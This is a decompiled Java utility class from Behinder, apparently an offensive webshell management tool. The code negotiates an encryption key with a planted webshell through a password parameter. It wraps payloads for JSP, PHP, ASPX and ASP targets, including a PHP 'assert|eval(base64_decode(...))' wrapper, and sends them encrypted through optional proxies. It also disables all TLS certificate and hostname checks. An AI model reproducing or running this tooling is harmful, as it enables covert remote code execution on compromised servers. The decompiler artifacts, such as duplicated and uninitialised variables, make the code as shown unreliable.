 package net.rebeyond.behinder.utils;
 
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.awt.Toolkit;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
 import java.awt.datatransfer.Transferable;
 import java.io.BufferedReader;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintStream;
 import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.URI;
 import java.net.URL;
 import java.net.UnknownHostException;
 import java.security.CodeSource;
 import java.security.KeyManagementException;
 import java.security.NoSuchAlgorithmException;
 import java.security.ProtectionDomain;
 import java.security.SecureRandom;
 import java.security.cert.X509Certificate;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Random;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.SSLParameters;
 import javax.net.ssl.SSLSession;
 import javax.net.ssl.SSLSocket;
 import javax.net.ssl.SSLSocketFactory;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 import javax.tools.FileObject;
 import javax.tools.ForwardingJavaFileManager;
 import javax.tools.JavaFileManager;
 import javax.tools.JavaFileManager.Location;
 import javax.tools.JavaFileObject;
 import javax.tools.JavaFileObject.Kind;
 import javax.tools.SimpleJavaFileObject;
 import net.rebeyond.behinder.core.Crypt;
 import net.rebeyond.behinder.core.Params;
 import net.rebeyond.behinder.ui.Main;
 import net.rebeyond.behinder.utils.jc.Run;
 import org.eclipse.swt.widgets.Control;
 import org.eclipse.swt.widgets.MessageBox;
 
 
 
 
 public class Utils
 {
   private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();
   
   public static boolean checkIP(String ipAddress)
   {
     String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
     Pattern pattern = Pattern.compile(ip);
     Matcher matcher = pattern.matcher(ipAddress);
     return matcher.matches();
   }
   
   public static boolean checkPort(String portTxt)
   {
     String port = "([0-9]{1,5})";
     Pattern pattern = Pattern.compile(port);
     Matcher matcher = pattern.matcher(portTxt);
     return (matcher.matches()) && (Integer.parseInt(portTxt) >= 1) && (Integer.parseInt(portTxt) <= 65535);
   }
   
   public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
     disableSslVerification();
     Map<String, String> result = new HashMap();
     StringBuffer sb = new StringBuffer();
     InputStreamReader isr = null;
     BufferedReader br = null;
     URL url;
     URL url; if (getUrl.indexOf("?") > 0) {
       url = new URL(getUrl + "&" + password + "=" + new Random().nextInt(1000));
     } else {
       url = new URL(getUrl + "?" + password + "=" + new Random().nextInt(1000));
     }
     
 
     HttpURLConnection.setFollowRedirects(false);
     HttpURLConnection urlConnection;
     String headerValue;
     HttpURLConnection urlConnection; if (url.getProtocol().equals("https")) {
       if (Main.currentProxy != null) {
         HttpURLConnection urlConnection = (HttpsURLConnection)url.openConnection(Main.currentProxy);
         if ((Main.proxyUserName != null) && (!Main.proxyUserName.equals(""))) {
           String headerkey = "Proxy-Authorization";
           String headerValue = "Basic " + 
             Base64.encode(new StringBuilder(String.valueOf(Main.proxyUserName)).append(":").append(Main.proxyPassword).toString().getBytes());
           urlConnection.setRequestProperty(headerkey, headerValue);
         }
       }
       else
       {
         urlConnection = (HttpsURLConnection)url.openConnection();
       }
       
     }
     else if (Main.currentProxy != null) {
       HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection(Main.currentProxy);
       if ((Main.proxyUserName != null) && (!Main.proxyUserName.equals(""))) {
         String headerkey = "Proxy-Authorization";
         headerValue = "Basic " + 
           Base64.encode(new StringBuilder(String.valueOf(Main.proxyUserName)).append(":").append(Main.proxyPassword).toString().getBytes());
         urlConnection.setRequestProperty(headerkey, headerValue);
       }
     }
     else
     {
       urlConnection = (HttpURLConnection)url.openConnection();
     }
     
 
     for (String headerName : requestHeaders.keySet()) {
       urlConnection.setRequestProperty(headerName, (String)requestHeaders.get(headerName));
     }
     if ((urlConnection.getResponseCode() == 302) || 
       (urlConnection.getResponseCode() == 301)) {
       String urlwithSession = ((String)((List)urlConnection.getHeaderFields().get("Location")).get(0)).toString();
       if (!urlwithSession.startsWith("http")) {
         urlwithSession = 
           url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
         urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
       }
       result.put("urlWithSession", urlwithSession);
     }
     
 
 
 
 
 
 
 
 
 
 
     boolean error = false;
     String errorMsg = "";
     if (urlConnection.getResponseCode() == 500) {
       isr = new InputStreamReader(urlConnection.getErrorStream());
       error = true;
       errorMsg = "密钥获取失败,密码错误?";
     } else if (urlConnection.getResponseCode() == 404) {
       isr = new InputStreamReader(urlConnection.getErrorStream());
       error = true;
       errorMsg = "页面返回404错误";
     } else {
       isr = new InputStreamReader(urlConnection.getInputStream());
     }
     
     br = new BufferedReader(isr);
     String line;
     while ((line = br.readLine()) != null) { String line;
       sb.append(line);
     }
     br.close();
     if (error) {
       throw new Exception(errorMsg);
     }
     
 
 
 
     String rawKey_1 = sb.toString();
     
 
 
     String pattern = "[a-fA-F0-9]{16}";
     Pattern r = Pattern.compile(pattern);
     Matcher m = r.matcher(rawKey_1);
     if (!m.find()) {
       throw new Exception("页面存在，但是无法获取密钥!");
     }
     
     int start = 0;int end = 0;
     int cycleCount = 0;
     for (;;) {
       Map<String, String> KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
       String rawKey_2 = (String)KeyAndCookie.get("key");
       byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
       for (int i = 0; i < temp.length; i++)
       {
         if (temp[i] > 0) {
           if ((start != 0) && (i > start)) break;
           start = i;
           break;
         }
       }
       for (int i = temp.length - 1; i >= 0; i--) {
         if (temp[i] > 0) {
           if (i < end) break;
           end = i + 1;
           break;
         }
       }
       if (end - start == 16) {
         result.put("cookie", (String)KeyAndCookie.get("cookie"));
         result.put("beginIndex", start);
         result.put("endIndex", temp.length - end);
         break;
       }
       
 
       if (cycleCount > 10) {
         throw new Exception("Can't figure out the key!");
       }
       
       cycleCount++;
     }
     String rawKey_2;
     String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
     
 
 
     result.put("key", finalKey);
     
     return result;
   }
   
   public static Map<String, String> getRawKey(String getUrl, String password, Map<String, String> requestHeaders)
     throws Exception
   {
     Map<String, String> result = new HashMap();
     StringBuffer sb = new StringBuffer();
     InputStreamReader isr = null;
     BufferedReader br = null;
     URL url;
     URL url; if (getUrl.indexOf("?") > 0) {
       url = new URL(getUrl + "&" + password + "=" + new Random().nextInt(1000));
     } else {
       url = new URL(getUrl + "?" + password + "=" + new Random().nextInt(1000));
     }
     
 
     HttpURLConnection.setFollowRedirects(false);
     HttpURLConnection urlConnection;
     String headerValue;
     HttpURLConnection urlConnection; if (url.getProtocol().equals("https")) {
       if (Main.currentProxy != null) {
         HttpURLConnection urlConnection = (HttpsURLConnection)url.openConnection(Main.currentProxy);
         if ((Main.proxyUserName != null) && (!Main.proxyUserName.equals(""))) {
           String headerkey = "Proxy-Authorization";
           String headerValue = "Basic " + 
             Base64.encode(new StringBuilder(String.valueOf(Main.proxyUserName)).append(":").append(Main.proxyPassword).toString().getBytes());
           urlConnection.setRequestProperty(headerkey, headerValue);
         }
       }
       else
       {
         urlConnection = (HttpsURLConnection)url.openConnection();
       }
     }
     else if (Main.currentProxy != null) {
       HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection(Main.currentProxy);
       if ((Main.proxyUserName != null) && (!Main.proxyUserName.equals(""))) {
         String headerkey = "Proxy-Authorization";
         headerValue = "Basic " + 
           Base64.encode(new StringBuilder(String.valueOf(Main.proxyUserName)).append(":").append(Main.proxyPassword).toString().getBytes());
         urlConnection.setRequestProperty(headerkey, headerValue);
       }
     }
     else
     {
       urlConnection = (HttpURLConnection)url.openConnection();
     }
     
 
     for (String headerName : requestHeaders.keySet()) {
       urlConnection.setRequestProperty(headerName, (String)requestHeaders.get(headerName));
     }
     String cookieValues = "";
     
     Map<String, List<String>> headers = urlConnection.getHeaderFields();
     for (String headerName : headers.keySet()) {
       if (headerName != null)
       {
         if (headerName.equalsIgnoreCase("Set-Cookie")) {
           for (String cookieValue : (List)headers.get(headerName)) {
             cookieValues = cookieValues + ";" + cookieValue;
           }
           cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
           break;
         } }
     }
     result.put("cookie", cookieValues);
     boolean error = false;
     String errorMsg = "";
     if (urlConnection.getResponseCode() == 500) {
       isr = new InputStreamReader(urlConnection.getErrorStream());
       error = true;
       errorMsg = "密钥获取失败,密码错误?";
     } else if (urlConnection.getResponseCode() == 404) {
       isr = new InputStreamReader(urlConnection.getErrorStream());
       error = true;
       errorMsg = "页面返回404错误";
     } else {
       isr = new InputStreamReader(urlConnection.getInputStream());
     }
     
     br = new BufferedReader(isr);
     String line;
     while ((line = br.readLine()) != null) { String line;
       sb.append(line);
     }
     br.close();
     if (error) {
       throw new Exception(errorMsg);
     }
     result.put("key", sb.toString());
     return result;
   }
   
   public static String sendPostRequest(String urlPath, String cookie, String data) throws Exception {
     StringBuilder result = new StringBuilder();
     URL url = new URL(urlPath);
     HttpURLConnection conn = (HttpURLConnection)url.openConnection();
     conn.setRequestMethod("POST");
     conn.setDoOutput(true);
     conn.setDoInput(true);
     conn.setUseCaches(false);
     if ((cookie != null) && (!cookie.equals("")))
       conn.setRequestProperty("Cookie", cookie);
     OutputStream outwritestream = conn.getOutputStream();
     outwritestream.write(data.getBytes());
     outwritestream.flush();
     outwritestream.close();
     if (conn.getResponseCode() == 200)
     {
 
       BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
       String line;
       while ((line = reader.readLine()) != null) { String line;
         result = result.append(line + "\n");
       } }
     return result.toString();
   }
   
   public static Map<String, Object> requestAndParse(String urlPath, Map<String, String> header, byte[] data, int beginIndex, int endIndex) throws Exception
   {
     Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
     byte[] resData = (byte[])resultObj.get("data");
     if ((beginIndex != 0) || (endIndex != 0))
     {
       if (resData.length - endIndex >= beginIndex)
       {
         resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
       }
     }
     
     resultObj.put("data", resData);
     return resultObj;
   }
   
   public static Map<String, Object> sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception
   {
     Map<String, Object> result = new HashMap();
     ByteArrayOutputStream bos = new ByteArrayOutputStream();
     
     URL url = new URL(urlPath);
     String headerValue;
     HttpURLConnection conn; if (Main.currentProxy != null) {
       HttpURLConnection conn = (HttpURLConnection)url.openConnection(Main.currentProxy);
       if ((Main.proxyUserName != null) && (!Main.proxyUserName.equals(""))) {
         String headerkey = "Proxy-Authorization";
         headerValue = "Basic " + 
           Base64.encode(new StringBuilder(String.valueOf(Main.proxyUserName)).append(":").append(Main.proxyPassword).toString().getBytes());
         conn.setRequestProperty(headerkey, headerValue);
       }
     }
     else {
       conn = (HttpURLConnection)url.openConnection();
     }
     
 
 
 
 
 
     conn.setRequestProperty("Content-Type", "application/octet-stream");
     conn.setRequestMethod("POST");
     if (header != null) {
       for (String key : header.keySet()) {
         conn.setRequestProperty(key, (String)header.get(key));
       }
     }
     conn.setDoOutput(true);
     conn.setDoInput(true);
     conn.setUseCaches(false);
     
 
     OutputStream outwritestream = conn.getOutputStream();
     outwritestream.write(data);
     outwritestream.flush();
     outwritestream.close();
     if (conn.getResponseCode() == 200) {
       DataInputStream din = new DataInputStream(conn.getInputStream());
       byte[] buffer = new byte['Ѐ'];
       int length = 0;
       while ((length = din.read(buffer)) != -1) {
         bos.write(buffer, 0, length);
       }
     }
     else {
       DataInputStream din = new DataInputStream(conn.getErrorStream());
       byte[] buffer = new byte['Ѐ'];
       int length = 0;
       while ((length = din.read(buffer)) != -1) {
         bos.write(buffer, 0, length);
       }
       
       throw new Exception(new String(bos.toByteArray(), "GBK"));
     }
     byte[] resData = bos.toByteArray();
     System.out.println("res before decrypt:" + new String(resData));
     result.put("data", resData);
     Map<String, String> responseHeader = new HashMap();
     for (String key : conn.getHeaderFields().keySet()) {
       responseHeader.put(key, conn.getHeaderField(key));
     }
     responseHeader.put("status", conn.getResponseCode());
     result.put("header", responseHeader);
     return result;
   }
   
   public static String sendPostRequest(String urlPath, String cookie, byte[] data) throws Exception {
     StringBuilder sb = new StringBuilder();
     URL url = new URL(urlPath);
     HttpURLConnection conn = (HttpURLConnection)url.openConnection();
     conn.setRequestProperty("Content-Type", "application/octet-stream");
     
 
     conn.setRequestMethod("POST");
     conn.setDoOutput(true);
     conn.setDoInput(true);
     conn.setUseCaches(false);
     if ((cookie != null) && (!cookie.equals("")))
       conn.setRequestProperty("Cookie", cookie);
     OutputStream outwritestream = conn.getOutputStream();
     outwritestream.write(data);
     outwritestream.flush();
     outwritestream.close();
     
     if (conn.getResponseCode() == 200) {
       BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
       String line;
       while ((line = reader.readLine()) != null) { String line;
         sb = sb.append(line + "\n");
       }
     } else { BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
       String line;
       while ((line = reader.readLine()) != null) { String line;
         sb = sb.append(line + "\n"); }
       throw new Exception("请求返回异常" + sb.toString());
     }
     String result = sb.toString();
     if (result.endsWith("\n"))
       result = result.substring(0, result.length() - 1);
     return result;
   }
   
   public static String sendGetRequest(String urlPath, String cookie) throws Exception {
     StringBuilder sb = new StringBuilder();
     URL url = new URL(urlPath);
     HttpURLConnection conn = (HttpURLConnection)url.openConnection();
     conn.setRequestProperty("Content-Type", "text/plain");
     conn.setRequestMethod("GET");
     conn.setDoOutput(true);
     conn.setDoInput(true);
     conn.setUseCaches(false);
     if ((cookie != null) && (!cookie.equals(""))) {
       conn.setRequestProperty("Cookie", cookie);
     }
     if (conn.getResponseCode() == 200) {
       BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
       String line;
       while ((line = reader.readLine()) != null) { String line;
         sb = sb.append(line + "\n");
       }
     } else { BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
       String line;
       while ((line = reader.readLine()) != null) { String line;
         sb = sb.append(line + "\n"); }
       throw new Exception("请求返回异常" + sb.toString());
     }
     String result = sb.toString();
     if (result.endsWith("\n"))
       result = result.substring(0, result.length() - 1);
     return result;
   }
   
   public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
     byte[] result = null;
     if (type.equals("jsp")) {
       byte[] encrypedBincls = Crypt.Encrypt(payload, key);
       String basedEncryBincls = Base64.encode(encrypedBincls);
       result = basedEncryBincls.getBytes();
     } else if (type.equals("php")) {
       byte[] bincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
       byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
       result = Base64.encode(encrypedBincls).getBytes();
     } else if (type.equals("aspx")) {
       Map<String, String> params = new LinkedHashMap();
       params.put("code", new String(payload));
       result = getData(key, encryptType, "Eval", params, type);
     } else if (type.equals("asp")) {
       byte[] encrypedBincls = Crypt.EncryptForAsp(payload, key);
       result = encrypedBincls;
     }
     return result;
   }
   
   public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception
   {
     return getData(key, encryptType, className, params, type, null);
   }
   
   public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception
   {
     if (type.equals("jsp")) {
       className = "net.rebeyond.behinder.payload.java." + className;
       byte[] bincls = Params.getParamedClass(className, params);
       if (extraData != null) {
         bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
       }
       byte[] encrypedBincls = Crypt.Encrypt(bincls, key);
       String basedEncryBincls = Base64.encode(encrypedBincls);
       return basedEncryBincls.getBytes(); }
     if (type.equals("php")) {
       byte[] bincls = Params.getParamedPhp(className, params);
       
 
       bincls = Base64.encode(bincls).getBytes();
       bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
       if (extraData != null) {
         bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
       }
       byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
       return Base64.encode(encrypedBincls).getBytes(); }
     if (type.equals("aspx")) {
       byte[] bincls = Params.getParamedAssembly(className, params);
       if (extraData != null) {
         bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
       }
       byte[] encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
       return encrypedBincls; }
     if (type.equals("asp")) {
       byte[] bincls = Params.getParamedAsp(className, params);
       
       if (extraData != null) {
         bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
       }
       byte[] encrypedBincls = Crypt.EncryptForAsp(bincls, key);
       return encrypedBincls;
     }
     return null;
   }
   
   public static byte[] getFileData(String filePath) throws Exception
   {
     byte[] fileContent = new byte[0];
     FileInputStream fis = new FileInputStream(new File(filePath));
     byte[] buffer = new byte[10240000];
     int length = 0;
     while ((length = fis.read(buffer)) > 0) {
       fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length));
     }
     fis.close();
     return fileContent;
   }
   
   public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
     List<byte[]> result = new ArrayList();
     byte[] buffer = new byte[size];
     ByteArrayInputStream bis = new ByteArrayInputStream(content);
     int length = 0;
     while ((length = bis.read(buffer)) > 0) {
       result.add(Arrays.copyOfRange(buffer, 0, length));
     }
     bis.close();
     return result;
   }
   
   public static void setClipboardString(String text)
   {
     Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
     
     Transferable trans = new StringSelection(text);
     
     clipboard.setContents(trans, null);
   }
   
   public static byte[] getResourceData(String filePath) throws Exception {
     InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
     ByteArrayOutputStream bos = new ByteArrayOutputStream();
     byte[] buffer = new byte[102400];
     int num = 0;
     while ((num = is.read(buffer)) != -1) {
       bos.write(buffer, 0, num);
       bos.flush();
     }
     is.close();
     return bos.toByteArray();
   }
   
   public static byte[] ascii2unicode(String str, int type) throws Exception {
     ByteArrayOutputStream buf = new ByteArrayOutputStream();
     DataOutputStream out = new DataOutputStream(buf);
     byte[] arrayOfByte;
     int j = (arrayOfByte = str.getBytes()).length; for (int i = 0; i < j; i++) { byte b = arrayOfByte[i];
       out.writeByte(b);
       out.writeByte(0);
     }
     if (type == 1)
       out.writeChar(0);
     return buf.toByteArray();
   }
   
   public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
     ByteArrayOutputStream output = new ByteArrayOutputStream();
     output.write(a);
     output.write(b);
     return output.toByteArray();
   }
   
   public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
     return Run.getClassFromSourceCode(sourceCode);
   }
   
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   public static String getSelfPath()
     throws Exception
   {
     String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
     currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
     currentPath = new File(currentPath).getCanonicalPath();
     return currentPath;
   }
   
   public static void main(String[] args) {
     String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";
     try {
       getClassFromSourceCode(sourceCode);
     }
     catch (Exception e) {
       e.printStackTrace();
     }
   }
   
   public static class MyJavaFileObject extends SimpleJavaFileObject {
     private String source;
     private ByteArrayOutputStream outPutStream;
     
     public MyJavaFileObject(String name, String source) {
       super(JavaFileObject.Kind.SOURCE);
       this.source = source;
     }
     
     public MyJavaFileObject(String name, JavaFileObject.Kind kind) {
       super(kind);
       this.source = null;
     }
     
     public CharSequence getCharContent(boolean ignoreEncodingErrors)
     {
       if (this.source == null) {
         throw new IllegalArgumentException("source == null");
       }
       return this.source;
     }
     
     public OutputStream openOutputStream() throws IOException
     {
       this.outPutStream = new ByteArrayOutputStream();
       return this.outPutStream;
     }
     
     public byte[] getCompiledBytes() {
       return this.outPutStream.toByteArray();
     }
   }
   
   private static class MySSLSocketFactory extends SSLSocketFactory
   {
     private SSLSocketFactory sf = null;
     private String[] enabledCiphers = null;
     
     private MySSLSocketFactory(SSLSocketFactory sf, String[] enabledCiphers)
     {
       this.sf = sf;
       this.enabledCiphers = enabledCiphers;
     }
     
     private Socket getSocketWithEnabledCiphers(Socket socket) {
       if ((this.enabledCiphers != null) && (socket != null) && ((socket instanceof SSLSocket))) {
         ((SSLSocket)socket).setEnabledCipherSuites(this.enabledCiphers);
       }
       return socket;
     }
     
     public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException
     {
       return getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
     }
     
     public String[] getDefaultCipherSuites()
     {
       return this.sf.getDefaultCipherSuites();
     }
     
     public String[] getSupportedCipherSuites()
     {
       if (this.enabledCiphers == null) {
         return this.sf.getSupportedCipherSuites();
       }
       return this.enabledCiphers;
     }
     
     public Socket createSocket(String host, int port) throws IOException, UnknownHostException
     {
       return getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
     }
     
     public Socket createSocket(InetAddress address, int port) throws IOException
     {
       return getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
     }
     
     public Socket createSocket(String host, int port, InetAddress localAddress, int localPort)
       throws IOException, UnknownHostException
     {
       return getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
     }
     
     public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport)
       throws IOException
     {
       return getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
     }
   }
   
 
   private static void disableSslVerification()
   {
     try
     {
       TrustManager[] trustAllCerts = { new X509TrustManager() {
         public X509Certificate[] getAcceptedIssuers() {
           return null;
         }
         
 
 
         public void checkClientTrusted(X509Certificate[] certs, String authType) {}
         
 
 
         public void checkServerTrusted(X509Certificate[] certs, String authType) {}
       } };
       SSLContext sc = SSLContext.getInstance("SSL");
       
       sc.init(null, trustAllCerts, new SecureRandom());
       
       List<String> cipherSuites = new ArrayList();
       String[] arrayOfString; int j = (arrayOfString = sc.getSupportedSSLParameters().getCipherSuites()).length; for (int i = 0; i < j; i++) { String cipher = arrayOfString[i];
         if ((cipher.indexOf("_DHE_") < 0) && (cipher.indexOf("_DH_") < 0)) {
           cipherSuites.add(cipher);
         }
       }
       
       HttpsURLConnection.setDefaultSSLSocketFactory(
         new MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0]), null));
       
 
       HostnameVerifier allHostsValid = new HostnameVerifier() {
         public boolean verify(String hostname, SSLSession session) {
           return true;
         }
         
 
       };
       HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
     } catch (NoSuchAlgorithmException e) {
       e.printStackTrace();
     } catch (KeyManagementException e) {
       e.printStackTrace();
     }
   }
   
   public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager>
   {
     protected MyJavaFileManager(JavaFileManager fileManager) {
       super();
     }
     
     public JavaFileObject getJavaFileForInput(JavaFileManager.Location location, String className, JavaFileObject.Kind kind)
       throws IOException
     {
       JavaFileObject javaFileObject = (JavaFileObject)Utils.fileObjects.get(className);
       if (javaFileObject == null) {
         super.getJavaFileForInput(location, className, kind);
       }
       return javaFileObject;
     }
     
     public JavaFileObject getJavaFileForOutput(JavaFileManager.Location location, String qualifiedClassName, JavaFileObject.Kind kind, FileObject sibling)
       throws IOException
     {
       JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
       Utils.fileObjects.put(qualifiedClassName, javaFileObject);
       return javaFileObject;
     }
   }
   
   public static void showError(Control control, String errorTxt)
   {
     MessageBox dialog = new MessageBox(control.getShell(), 33);
     dialog.setText("保存失败");
     dialog.setMessage(errorTxt);
     dialog.open();
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/utils/Utils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */